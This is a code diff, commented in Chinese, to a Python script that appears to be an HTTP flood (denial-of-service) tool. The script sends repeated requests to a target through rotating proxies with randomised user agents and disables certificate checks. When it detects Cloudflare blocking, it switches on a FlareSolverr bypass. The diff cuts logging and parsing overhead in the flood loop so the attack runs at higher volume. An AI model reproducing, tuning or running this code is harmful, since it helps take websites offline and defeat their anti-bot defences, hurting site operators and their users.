@@ -17,6 +17,11 @@ import os
 from collections import defaultdict
 import json
 
+
+DEBUG_MODE = True   # 开启调试输出
+DEBUG_SAMPLE_RATE = 1000  # 调试信息每1000次请求打印一次
+SAMPLE_RATE = 10    # 更频繁的统计采样
+
 # FlareSolverr配置（添加到全局统计变量后）
 FLARESOLVERR_URL = "http://localhost:8191/v1"
 USE_FLARESOLVERR = False
@@ -251,7 +256,7 @@ def get_flaresolverr_session():
 
 
 def update_stats_simple(status_code=None, is_error=False, error_type=None, debug_info=None):
-    """简化的统计更新 - 增强版"""
+    """简化的统计更新 - 性能优化版"""
     global request_count, status_codes, error_count, success_count
     
     with stats_lock:
@@ -264,24 +269,27 @@ def update_stats_simple(status_code=None, is_error=False, error_type=None, debug
                 error_key = f"ERROR_{error_type}" if error_type else "ERROR_UNKNOWN"
                 status_codes[error_key] += 1
                 
-                # 记录详细的错误信息
-                if debug_info:
+                # 只在调试模式且满足调试采样率时才打印
+                if DEBUG_MODE and request_count % DEBUG_SAMPLE_RATE == 0 and debug_info:
                     print(f"[DEBUG] 错误详情 - 类型: {error_type}, 信息: {debug_info}")
                     
             elif status_code:
                 success_count += 1
                 status_codes[status_code] += 1
             else:
-                # UNKNOWN状态 - 详细记录原因
+                # UNKNOWN状态 - 只记录，不频繁打印
                 error_count += 1
                 unknown_key = f"UNKNOWN_{error_type}" if error_type else "UNKNOWN_NO_RESPONSE"
                 status_codes[unknown_key] += 1
                 
-                print(f"[DEBUG] UNKNOWN状态 - 原因: {error_type or 'NO_RESPONSE'}, 详情: {debug_info or 'N/A'}")
+                # 只在调试模式且满足调试采样率时才打印
+                if DEBUG_MODE and request_count % DEBUG_SAMPLE_RATE == 0:
+                    print(f"[DEBUG] UNKNOWN状态 - 原因: {error_type or 'NO_RESPONSE'}, 详情: {debug_info or 'N/A'}")
         
         # 打印统计
         if request_count % REPORT_INTERVAL == 0:
             print_stats()
+
 
 def print_stats():
     """打印统计信息 - 增强版"""
@@ -341,41 +349,44 @@ def print_stats():
     print(f"{'='*60}\n")
 
 def parse_response(response_data):
-    """解析HTTP响应获取状态码 - 增强版"""
+    """解析HTTP响应获取状态码 - 性能优化版"""
     try:
         if not response_data:
             return None
             
         response_str = response_data.decode('utf-8', errors='ignore')
-        lines = response_str.split('\n')
+        lines = response_str.split('\n', 1)  # 只分割第一行，提高性能
         
         if not lines:
-            print(f"[DEBUG] 响应解析失败: 没有行数据")
+            if DEBUG_MODE:
+                print(f"[DEBUG] 响应解析失败: 没有行数据")
             return None
             
         first_line = lines[0].strip()
         if 'HTTP/' not in first_line:
-            print(f"[DEBUG] 响应解析失败: 首行不包含HTTP - '{first_line[:50]}'")
+            if DEBUG_MODE:
+                print(f"[DEBUG] 响应解析失败: 首行不包含HTTP - '{first_line[:50]}'")
             return None
             
-        parts = first_line.split()
+        parts = first_line.split(' ', 2)  # 只分割前3部分，提高性能
         if len(parts) < 2:
-            print(f"[DEBUG] 响应解析失败: HTTP行格式错误 - '{first_line}'")
+            if DEBUG_MODE:
+                print(f"[DEBUG] 响应解析失败: HTTP行格式错误 - '{first_line}'")
             return None
             
         try:
             status_code = int(parts[1])
             return status_code
         except ValueError:
-            print(f"[DEBUG] 响应解析失败: 状态码不是数字 - '{parts[1]}'")
+            if DEBUG_MODE:
+                print(f"[DEBUG] 响应解析失败: 状态码不是数字 - '{parts[1]}'")
             return None
             
-    except UnicodeDecodeError as e:
-        print(f"[DEBUG] 响应解析失败: 编码错误 - {str(e)}")
-        return None
     except Exception as e:
-        print(f"[DEBUG] 响应解析失败: 未知错误 - {str(e)}")
+        if DEBUG_MODE:
+            print(f"[DEBUG] 响应解析失败: 未知错误 - {str(e)}")
         return None
+
 
 def getuseragent():
 	platform = Choice(['Macintosh', 'Windows', 'X11'])
@@ -724,7 +735,6 @@ def post(event, proxy_type):
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
             
-            # 连接成功，重置错误计数
             error_count = 0
             
             try:
@@ -732,18 +742,18 @@ def post(event, proxy_type):
                     sent = s.send(str.encode(request))
                     if not sent:
                         proxy = Choice(proxies).strip().split(":")
-                        update_stats_simple(is_error=True, error_type="SEND_FAILED", 
-                                          debug_info=f"发送失败，代理: {proxy[0]}:{proxy[1]}")
+                        # 减少debug_info的字符串构建开销
+                        debug_info = f"proxy:{proxy[0]}:{proxy[1]}" if DEBUG_MODE else None
+                        update_stats_simple(is_error=True, error_type="SEND_FAILED", debug_info=debug_info)
                         break
                     
-                    # 尝试接收响应并统计
                     try:
-                        s.settimeout(2)  # 设置接收超时
+                        s.settimeout(2)
                         response = s.recv(1024)
                         
                         if not response:
                             update_stats_simple(status_code=None, error_type="EMPTY_RESPONSE", 
-                                              debug_info="服务器返回空响应")
+                                              debug_info="empty" if DEBUG_MODE else None)
                             continue
                             
                         status_code = parse_response(response)
@@ -751,7 +761,6 @@ def post(event, proxy_type):
                         if status_code:
                             update_stats_simple(status_code=status_code)
                             
-                            # 检测CF并更新header
                             if is_cloudflare_blocked(response) and not USE_FLARESOLVERR:
                                 print(f"[CF检测] 发现Cloudflare拦截，正在启用绕过...")
                                 USE_FLARESOLVERR = True
@@ -760,53 +769,52 @@ def post(event, proxy_type):
                                     print("[CF绕过] Cloudflare挑战已解决")
                                     request = GenReqHeader("post")
                         else:
-                            # 无法解析状态码
-                            response_preview = response[:100].decode('utf-8', errors='ignore')
-                            update_stats_simple(status_code=None, error_type="PARSE_FAILED", 
-                                              debug_info=f"无法解析状态码，响应前100字符: {response_preview}")
+                            # 只在调试模式时构建详细信息
+                            debug_info = None
+                            if DEBUG_MODE:
+                                response_preview = response[:50].decode('utf-8', errors='ignore')
+                                debug_info = f"parse_fail:{response_preview}"
+                            update_stats_simple(status_code=None, error_type="PARSE_FAILED", debug_info=debug_info)
                             
                     except socket.timeout:
-                        update_stats_simple(is_error=True, error_type="RECV_TIMEOUT", 
-                                          debug_info="接收响应超时")
+                        update_stats_simple(is_error=True, error_type="RECV_TIMEOUT", debug_info=None)
                     except socket.error as e:
-                        update_stats_simple(is_error=True, error_type="SOCKET_ERROR", 
-                                          debug_info=f"Socket错误: {str(e)}")
+                        debug_info = str(e) if DEBUG_MODE else None
+                        update_stats_simple(is_error=True, error_type="SOCKET_ERROR", debug_info=debug_info)
                     except Exception as recv_error:
-                        update_stats_simple(is_error=True, error_type="RECV_EXCEPTION", 
-                                          debug_info=f"接收异常: {str(recv_error)}")
+                        debug_info = str(recv_error) if DEBUG_MODE else None
+                        update_stats_simple(is_error=True, error_type="RECV_EXCEPTION", debug_info=debug_info)
                         
                 s.close()
             except Exception as inner_error:
                 s.close()
-                update_stats_simple(is_error=True, error_type="INNER_LOOP", 
-                                  debug_info=f"内部循环异常: {str(inner_error)}")
+                debug_info = str(inner_error) if DEBUG_MODE else None
+                update_stats_simple(is_error=True, error_type="INNER_LOOP", debug_info=debug_info)
                 
         except socket.gaierror as e:
             s.close()
             proxy = Choice(proxies).strip().split(":")
             error_count += 1
-            update_stats_simple(is_error=True, error_type="DNS_ERROR", 
-                              debug_info=f"DNS解析错误: {str(e)}")
+            debug_info = str(e) if DEBUG_MODE else None
+            update_stats_simple(is_error=True, error_type="DNS_ERROR", debug_info=debug_info)
         except socket.timeout:
             s.close()
             proxy = Choice(proxies).strip().split(":")
             error_count += 1
-            update_stats_simple(is_error=True, error_type="CONNECT_TIMEOUT", 
-                              debug_info="连接超时")
+            update_stats_simple(is_error=True, error_type="CONNECT_TIMEOUT", debug_info=None)
         except ConnectionRefusedError:
             s.close()
             proxy = Choice(proxies).strip().split(":")
             error_count += 1
-            update_stats_simple(is_error=True, error_type="CONNECTION_REFUSED", 
-                              debug_info=f"连接被拒绝，代理: {proxy[0]}:{proxy[1]}")
+            debug_info = f"proxy:{proxy[0]}:{proxy[1]}" if DEBUG_MODE else None
+            update_stats_simple(is_error=True, error_type="CONNECTION_REFUSED", debug_info=debug_info)
         except Exception as outer_error:
             s.close()
             proxy = Choice(proxies).strip().split(":")
             error_count += 1
-            update_stats_simple(is_error=True, error_type="CONNECT_ERROR", 
-                              debug_info=f"连接异常: {str(outer_error)}")
+            debug_info = str(outer_error) if DEBUG_MODE else None
+            update_stats_simple(is_error=True, error_type="CONNECT_ERROR", debug_info=debug_info)
             
-            # 每50次连续错误打印一次警告
             if error_count % max_errors == 0:
                 print(f"[WARNING] POST线程连续失败 {error_count} 次，当前代理: {proxy[0]}:{proxy[1]}")
 
